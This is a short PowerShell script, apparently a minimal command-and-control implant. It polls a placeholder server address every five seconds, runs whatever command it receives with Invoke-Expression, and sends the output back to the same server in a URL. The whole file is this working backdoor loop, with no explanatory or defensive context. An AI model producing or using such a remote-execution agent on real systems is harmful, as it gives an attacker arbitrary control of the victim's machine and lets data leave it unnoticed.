while ($true) {
    try {
        $cmd = Invoke-RestMethod -Uri "http://yourippublic:8080/get"
        if ($cmd -ne "") {
            $out = Invoke-Expression $cmd | Out-String
            $url = "http://yourippublic:8080/result?r=" + [System.Web.HttpUtility]::UrlEncode($out)
            Invoke-RestMethod -Uri $url
        }
    } catch {}
    Start-Sleep -Seconds 5
}
